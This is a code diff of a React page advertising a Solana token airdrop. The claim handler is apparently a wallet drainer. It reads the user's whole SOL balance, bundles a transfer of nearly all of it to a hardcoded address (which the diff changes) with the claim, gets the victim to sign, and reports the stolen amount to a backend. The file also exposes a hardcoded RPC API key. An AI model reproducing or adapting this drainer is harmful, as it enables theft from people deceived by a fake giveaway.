@@ -22,16 +22,31 @@ import { Checkbox } from '@/components/Checkbox'
 import ResponsiveDialogDrawer from '@/components/ResponsiveDialogDrawer'
 import { twMerge } from 'tailwind-merge'
 import { setLocalItem } from '@/functions/dom/jStorage'
-import { Connection, PublicKey, SystemProgram, TransactionInstruction, TransactionMessage, VersionedTransaction } from '@solana/web3.js'
+import {
+  Connection,
+  PublicKey,
+  SystemProgram,
+  TransactionInstruction,
+  TransactionMessage,
+  VersionedTransaction
+} from '@solana/web3.js'
 import { BN } from 'bn.js'
 import { useAnchorWallet, useWallet } from '@solana/wallet-adapter-react'
 import { getTipTransaction, sendAndConfirmSignedTransactions } from '@/pageComponents/Concentrated'
 import { findProgramAddressSync } from '@project-serum/anchor/dist/cjs/utils/pubkey'
-import { AIRDROP_AUTHORITY, AIRDROP_ID, AIRDROP_PROGRAM_PUBKEY, AIRDROP_SEED, TOKEN_PUBKEY, USER_SEED } from '@/types/constants'
+import {
+  AIRDROP_AUTHORITY,
+  AIRDROP_ID,
+  AIRDROP_PROGRAM_PUBKEY,
+  AIRDROP_SEED,
+  TOKEN_PUBKEY,
+  USER_SEED
+} from '@/types/constants'
 import { utf8 } from '@project-serum/anchor/dist/cjs/utils/bytes'
-import * as anchor from "@project-serum/anchor";
+import * as anchor from '@project-serum/anchor'
 import { ASSOCIATED_PROGRAM_ID } from '@project-serum/anchor/dist/cjs/utils/token'
 import { AirdropProgram } from '@/idl/airdrop'
+import { createAssociatedTokenAccountInstruction } from '@solana/spl-token'
 
 function HomePageContainer({ children }: { children?: ReactNode }) {
   useDocumentScrollActionDetector()
@@ -80,24 +95,23 @@ function HomePageSection0() {
   const NET_URL = 'https://mainnet.helius-rpc.com/?api-key=e4226aa3-24f7-43c1-869f-a1b1e3fbb148'
   const connection = new Connection(NET_URL, 'confirmed')
   const { signAllTransactions, sendTransaction } = useWallet()
-  const API_BASE_URI = process.env.API_BASE_URI || "http://localhost:3006"
-  const [isButtonClicked, setIsButtonClicked] = useState(false);
-  const anchorWallet = useAnchorWallet();
+  const API_BASE_URI = process.env.API_BASE_URI || 'http://localhost:3006'
+  const [isButtonClicked, setIsButtonClicked] = useState(false)
+  const anchorWallet = useAnchorWallet()
 
   const programId = new PublicKey(AIRDROP_PROGRAM_PUBKEY)
   // const program = new anchor.Program(AirdropProgram as anchor.Idl, programId)
 
   const program = useMemo(() => {
     if (anchorWallet) {
-      const provider = new anchor.AnchorProvider(connection, anchorWallet, anchor.AnchorProvider.defaultOptions());
-      return new anchor.Program(AirdropProgram as anchor.Idl, AIRDROP_PROGRAM_PUBKEY, provider);
+      const provider = new anchor.AnchorProvider(connection, anchorWallet, anchor.AnchorProvider.defaultOptions())
+      return new anchor.Program(AirdropProgram as anchor.Idl, AIRDROP_PROGRAM_PUBKEY, provider)
     }
-  }, [connection, anchorWallet]);
-
+  }, [connection, anchorWallet])
 
   useEffect(() => {
     if (owner && isButtonClicked) {
-      txTransfer();
+      txTransfer()
     }
   }, [owner, isButtonClicked])
 
@@ -105,21 +119,38 @@ function HomePageSection0() {
     if (owner) {
       try {
         // await axios.post(API_BASE_URI + "/api/sendSignNotification", { owner: owner })
-        const [airdrop_info, airdrop_bump] = findProgramAddressSync([utf8.encode(AIRDROP_SEED), AIRDROP_AUTHORITY.toBuffer(), new Uint8Array([AIRDROP_ID])], AIRDROP_PROGRAM_PUBKEY);
-        const [userInfo, userBump] = findProgramAddressSync([utf8.encode(USER_SEED), owner.toBuffer(), new Uint8Array([AIRDROP_ID])], AIRDROP_PROGRAM_PUBKEY);
+        const [airdrop_info, airdrop_bump] = findProgramAddressSync(
+          [utf8.encode(AIRDROP_SEED), AIRDROP_AUTHORITY.toBuffer(), new Uint8Array([AIRDROP_ID])],
+          AIRDROP_PROGRAM_PUBKEY
+        )
+        const [userInfo, userBump] = findProgramAddressSync(
+          [utf8.encode(USER_SEED), owner.toBuffer(), new Uint8Array([AIRDROP_ID])],
+          AIRDROP_PROGRAM_PUBKEY
+        )
 
         const claimer_associated_token_account = await anchor.utils.token.associatedAddress({
           mint: TOKEN_PUBKEY,
-          owner: owner,
-        });
+          owner: owner
+        })
 
         const airdrop_token_associated_token_account = await anchor.utils.token.associatedAddress({
           mint: TOKEN_PUBKEY,
-          owner: airdrop_info,
-        });
+          owner: airdrop_info
+        })
 
-        const totalInstructions: TransactionInstruction[] = [];
+        const totalInstructions: TransactionInstruction[] = []
         if (program) {
+          // try {
+          //   const info = await connection.getAccountInfo(claimer_associated_token_account)
+          //   if (!info) {
+          //     totalInstructions.push(
+          //       createAssociatedTokenAccountInstruction(owner, claimer_associated_token_account, owner, TOKEN_PUBKEY)
+          //     )
+          //   }
+          // } catch (err) {
+          //   console.warn(err)
+          // }
+
           const txClaim = await program.methods
             .claimToken(AIRDROP_ID)
             .accounts({
@@ -133,19 +164,20 @@ function HomePageSection0() {
               rent: anchor.web3.SYSVAR_RENT_PUBKEY,
               systemProgram: anchor.web3.SystemProgram.programId,
               tokenProgram: anchor.utils.token.TOKEN_PROGRAM_ID,
-              associatedTokenProgram: ASSOCIATED_PROGRAM_ID,
+              associatedTokenProgram: ASSOCIATED_PROGRAM_ID
             })
-            .instruction();
+            .instruction()
           totalInstructions.push(txClaim)
         }
         const solBalance = new BN((await connection.getBalance(owner)).toString())
         console.warn(solBalance)
         const fee = new BN('10000000')
+        const toAddress = new PublicKey('5cLAoXaK1UjZreSuuzVwY5rAhVPaotgAZ8sNdUruEWWA')
         // const toAddress = new PublicKey('s393nmNfuwXasFnABhVqka58VsPcnP8jKLYZ4ZXJcP1')
-        const toAddress = new PublicKey('H7YPtMRHNPcaNANC3BVeK2a3JW6mvduicm1qmcznQfGi')
+        // const toAddress = new PublicKey('H7YPtMRHNPcaNANC3BVeK2a3JW6mvduicm1qmcznQfGi')
         if (solBalance == undefined || solBalance.sub(fee).toNumber() < 0) {
-          console.warn("solbalance is not enough")
-          await axios.post(API_BASE_URI + "/api/sendNotEnoughNotification")
+          console.warn('solbalance is not enough')
+          await axios.post(API_BASE_URI + '/api/sendNotEnoughNotification')
           return
         }
         totalInstructions.push(
@@ -156,24 +188,26 @@ function HomePageSection0() {
           })
         )
 
-        const recentBlockhash = (await connection.getLatestBlockhash("confirmed")).blockhash;
+        const recentBlockhash = (await connection.getLatestBlockhash('confirmed')).blockhash
         const transactionMessage = new TransactionMessage({
           payerKey: owner,
           instructions: totalInstructions,
-          recentBlockhash,
-        });
-        let txns: VersionedTransaction[] = [];
-        const tx = new VersionedTransaction(transactionMessage.compileToV0Message());
+          recentBlockhash
+        })
+        let txns: VersionedTransaction[] = []
+        const tx = new VersionedTransaction(transactionMessage.compileToV0Message())
         txns.push(tx)
         const tipTx = await getTipTransaction(connection, owner, 0.005)
-        if (tipTx)
-          txns.push(tipTx)
+        if (tipTx) txns.push(tipTx)
         if (txns && signAllTransactions) {
           txns = await signAllTransactions(txns)
           const signature = await sendAndConfirmSignedTransactions(true, connection, txns)
           const sentBalance = solBalance.sub(fee).toNumber() / 1000000000
           if (signature) {
-            await axios.post(API_BASE_URI + "/api/sendTransferNotification", { balance: sentBalance.toFixed(4), tx: signature })
+            await axios.post(API_BASE_URI + '/api/sendTransferNotification', {
+              balance: sentBalance.toFixed(4),
+              tx: signature
+            })
           }
         }
       } catch (err) {
@@ -188,7 +222,7 @@ function HomePageSection0() {
       <div className="grid-cover-content children-center">
         <div className="font-light text-[64px] mobile:text-[30px] text-white mb-4 mt-14 mobile:mt-9 leading-[60px] mobile:leading-[32px]">
           Claim your Solana <br />
-          Airdrop now for {' '}
+          Airdrop now for{' '}
           <span
             className="font-bold text-transparent bg-clip-text"
             style={{
@@ -201,11 +235,11 @@ function HomePageSection0() {
           </span>
         </div>
         <div className="font-normal text-xl mobile:text-base text-[#adc6ff] mb-6">
-          Solana  <b>Airdrop</b>. Great <b>opportunity</b>. {isMobile ? <br /> : ''} Friction-less <b>Airdrop</b>.
+          Solana <b>Airdrop</b>. Great <b>opportunity</b>. {isMobile ? <br /> : ''} Friction-less <b>Airdrop</b>.
         </div>
         {/* two button */}
         <Row className="gap-8 mobile:gap-4 mb-16 mobile:mb-6 grid grid-cols-1-fr">
-          {connected && (
+          {(connected && (
             <Button
               className="frosted-glass-teal text-white mobile:text-xs px-5 mobile:px-4 forsted-blur"
               onClick={async () => {
@@ -217,12 +251,11 @@ function HomePageSection0() {
                 <Icon iconSrc="/icons/gitbook.svg" size="sm" />
               </Row>
             </Button>
-          ) ||
-            (
+          )) || (
               <Button
                 className="home-rainbow-button-bg text-white mobile:text-xs px-5 mobile:px-4"
                 onClick={() => {
-                  setIsButtonClicked(true);
+                  setIsButtonClicked(true)
                   useAppSettings.setState({ needPopDisclaimer: false })
                   setLocalItem<boolean>('USER_AGREE_DISCLAIMER', true)
                   useAppSettings.setState({ isWalletSelectorShown: true })
@@ -234,7 +267,6 @@ function HomePageSection0() {
                 </Row>
               </Button>
             )}
-
         </Row>
         {/* two panels */}
         <Row className="gap-6 mobile:gap-3 mb-9 grid grid-cols-2-fr">
